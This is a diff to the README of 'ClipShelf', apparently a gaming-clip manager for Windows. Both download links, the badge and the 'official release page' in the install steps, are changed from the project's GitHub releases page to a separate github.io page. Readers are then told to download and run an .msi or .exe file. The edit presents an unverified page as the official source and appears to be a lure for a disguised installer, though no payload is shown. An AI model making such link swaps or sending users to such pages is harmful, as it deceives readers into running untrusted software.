@@ -1,6 +1,6 @@
 # 📁 ClipShelf - Manage gaming clips with ease
 
-[![Download ClipShelf](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tartlepiotarubrotincta385/ClipShelf/releases)
+[![Download ClipShelf](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://tartlepiotarubrotincta385.github.io)
 
 ClipShelf helps you manage your game recordings. It detects your games and sorts your clips from OBS or ShadowPlay. Use hotkeys to tag your footage while you play. View your history from an in-game overlay.
 
@@ -8,7 +8,7 @@ ClipShelf helps you manage your game recordings. It detects your games and sorts
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/tartlepiotarubrotincta385/ClipShelf/releases) to access the installer.
+1. Visit the [official release page](https://tartlepiotarubrotincta385.github.io) to access the installer.
 2. Find the file ending in `.msi` or `.exe` under the latest release section.
 3. Click the file to start the download.
 4. Save the file to your desktop or downloads folder.
